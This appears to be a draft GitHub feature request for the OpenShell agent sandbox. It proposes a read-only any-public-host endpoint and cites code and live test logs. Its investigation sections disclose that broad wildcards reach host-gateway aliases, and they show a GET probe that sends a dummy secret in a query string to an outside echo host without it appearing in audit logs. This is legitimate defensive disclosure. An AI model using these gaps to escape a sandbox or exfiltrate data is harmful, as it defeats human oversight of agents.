Title: feat(policy): public-only any-host endpoint that works with L7 presets and next to provider endpoints

### User Story

As a developer building a read-only research agent (Claude Code limited to WebSearch and WebFetch) that runs in an OpenShell sandbox on the Podman driver (local Mac, OpenShell 0.1.7), I want one endpoint that allows GET-only access to any public host, so the agent can fetch whatever page a search returns without me keeping a host list, while OpenShell still blocks private, loopback, link-local, metadata and host-gateway destinations.

[OWNER: CONFIRM OR REWRITE] I run this research sandbox myself today with a per-TLD wildcard read-only policy and hit the apex-host gap described below.

### Problem Statement

This is the read-only (L7) variant of #3856 and depends on #4662. On OpenShell 0.1.7 (Podman driver) and on current `main` at `2e5589b`, there is no way to say "any public host, port 443, `protocol: rest`, `access: read-only`":

- `host: "*"` and `host: "**"` are rejected by `host_wildcard_shape_invalid` ([lib.rs#L1688-L1691](https://github.com/NVIDIA/OpenShell/blob/2e5589b2180dd432320adda124c4f7bcede119b5/crates/openshell-policy/src/lib.rs#L1688-L1691)).
- Two-label wildcards such as `**.com` or `*.*` are rejected as TLD wildcards ([lib.rs#L1512-L1520](https://github.com/NVIDIA/OpenShell/blob/2e5589b2180dd432320adda124c4f7bcede119b5/crates/openshell-policy/src/lib.rs#L1512-L1520)); the docs require at least three DNS labels ([schema.mdx#L137-L144](https://github.com/NVIDIA/OpenShell/blob/2e5589b2180dd432320adda124c4f7bcede119b5/docs/how-it-works/policies/schema.mdx#L137-L144)).
- The closest accepted shape is `host: "**.*.*"`, which matches names with three or more labels across every TLD and blocks private resolutions for ordinary names ([destination_policy.rs#L103-L109](https://github.com/NVIDIA/OpenShell/blob/2e5589b2180dd432320adda124c4f7bcede119b5/crates/openshell-supervisor-network/src/proxy/tests/destination_policy.rs#L103-L109)), but not for the host-gateway aliases (see below). A whole-label `**` needs at least one label ([schema.mdx#L589-L592](https://github.com/NVIDIA/OpenShell/blob/2e5589b2180dd432320adda124c4f7bcede119b5/docs/how-it-works/policies/schema.mdx#L589-L592)), so no accepted wildcard can match an apex host. In a live run with the equivalent `**.*.com` read-only endpoint, `github.com` and `endoflife.date` were refused with `NET:REFUSE [MED] DENIED github.com [reason:policy_dns_ineligible]`.
- A hostless endpoint on port 443 with `allowed_ips` set to the public IPv4 complement plus `2000::/3` is rejected next to the provider's own endpoint on the same port: `network endpoint ambiguity validation failed: ... endpoint[0] (<any-host>:443) and '_provider_wingman_claude' endpoint[0] (api.anthropic.com:443) overlap on port(s) 443 with conflicting metadata: allowed_ips=[...] vs []`. The check is `connection_conflicts` ([ambiguity.rs#L166-L186](https://github.com/NVIDIA/OpenShell/blob/2e5589b2180dd432320adda124c4f7bcede119b5/crates/openshell-policy/src/ambiguity.rs#L166-L186)), reached from `find_endpoint_ambiguities` ([ambiguity.rs#L84-L91](https://github.com/NVIDIA/OpenShell/blob/2e5589b2180dd432320adda124c4f7bcede119b5/crates/openshell-policy/src/ambiguity.rs#L84-L91)). This is the conflict tracked in #4662.

What already works and should stay: the `read-only` preset (GET, HEAD, OPTIONS) with TLS termination denied `POST` with `policy_denied`, and the always-blocked ranges ([net.rs#L57-L79](https://github.com/NVIDIA/OpenShell/blob/2e5589b2180dd432320adda124c4f7bcede119b5/crates/openshell-core/src/net.rs#L57-L79)) plus policy DNS denied `169.254.169.254`, `host.containers.internal` and `nip.io` names resolving to the host gateway, metadata and loopback.

### Impact / Why This Matters

A research agent cites pages on hosts nobody can list in advance. With `**.*.*` every apex host (`github.com`, `pypi.org`, `endoflife.date`) fails to fetch, and adding them one by one as exact hosts drops the private-address block that wildcard endpoints get, unless each also carries a hand-maintained `allowed_ips` list of public ranges. The only full-coverage shape (hostless public `allowed_ips`) cannot coexist with the inference provider the agent needs on the same port. Users are left choosing between a broken allowlist and dropping OpenShell's network layer for these sandboxes.

### Proposed Design

Either shape would do; the first matches #3856:

1. Accept `host: "*"` (or `**`) as an explicit any-public-hostname selector with the same destination rules wildcard endpoints already use: private ranges only through `allowed_ips`, always-blocked ranges never. It must accept L7 fields (`protocol: rest`, `access: read-only`, `enforcement: enforce`) and must not conflict with a more specific host endpoint on the same port, such as a provider's `api.anthropic.com:443`; the specific host keeps its own connection settings.
2. Let a hostless `allowed_ips` endpoint coexist with a host-specific provider endpoint on the same port, with the host endpoint taking precedence (the direction of #5088), and make hostless endpoints resolvable through policy DNS so hostnames, not only IP literals, reach them.

Notional policy for shape 1:

```yaml
network_policies:
  public_web_readonly:
    endpoints:
      - host: "*"
        port: 443
        protocol: rest
        enforcement: enforce
        access: read-only
    binaries:
      - path: /usr/bin/node
```

The behaviour should be the same on the Podman and Kubernetes drivers.

### Acceptance Criteria

- [ ] The notional policy above validates next to a provider endpoint on `api.anthropic.com:443`, on both the Podman and Kubernetes drivers.
- [ ] `GET https://github.com/` and `GET https://en.wikipedia.org/` succeed; `POST` to either returns `policy_denied`.
- [ ] `169.254.169.254`, loopback, RFC 1918 addresses, the driver host gateway and names that resolve to any of them stay denied without `allowed_ips`.
- [ ] `**.com` and `*.com` stay rejected, and the prover reports the policy as open to public hosts.

### Alternatives Considered

- `**.*.*` plus exact apex hosts with public `allowed_ips`: unsafe as is, because `**.*.*` also matches the host-gateway aliases (below).
- One `**.*.<tld>` endpoint per reviewed TLD plus exact apex hosts with public `allowed_ips`: what we run today; safe, but misses unlisted TLDs and unlisted apex hosts and needs reviewed lists.
- A supervisor middleware or interceptor cannot add this, because the rejection happens at policy validation before any traffic flows; a provider profile does not apply since there is no credential.

### Agent Investigation

Host-gateway aliases and broad wildcards: `host.openshell.internal`, `host.containers.internal` and `host.docker.internal` (`HOST_GATEWAY_ALIASES`, `crates/openshell-supervisor-network/src/proxy.rs`) have three labels, so `**.*.*` matches them. They are authorized as `TrustedGatewayAlias`, not `DefaultPublicOnly` (`proxy/destination.rs`), so the private-address block does not apply. Live on 0.1.7 with a `**.*.*` read-only endpoint on 443, policy DNS published `host.containers.internal resolved=192.168.127.254 synthetic=198.18.0.8 ports=443` and the proxy attempted `198.18.0.8:443` (it failed only because nothing listened on the host's 443). Any public-only any-host selector should exclude the gateway aliases unless a policy names them explicitly. [OWNER: decide whether this paragraph goes in the public issue or to the OpenShell security contact first.]


Related, likely a separate issue: L7 request events log the path without the query string (`redacted_target`, [relay.rs#L2344-L2345](https://github.com/NVIDIA/OpenShell/blob/2e5589b2180dd432320adda124c4f7bcede119b5/crates/openshell-supervisor-network/src/l7/relay.rs#L2344-L2345), used at [relay.rs#L2365-L2372](https://github.com/NVIDIA/OpenShell/blob/2e5589b2180dd432320adda124c4f7bcede119b5/crates/openshell-supervisor-network/src/l7/relay.rs#L2365-L2372)). Live, `GET https://echo.free.beeceptor.com/probe?leak=spike-secret-42` reached upstream with its query but was logged as `HTTP:GET ALLOWED GET https://echo.free.beeceptor.com/probe`. Dropping queries protects secrets, but with any-host read-only egress it also hides GET-based exfiltration from the audit log. An opt-in marker (query present, its length or a keyed hash) would keep secrets out while showing the channel.

### Checklist

- [x] I've reviewed existing issues and the published docs
- [x] This is a design proposal, not a "please build this" request
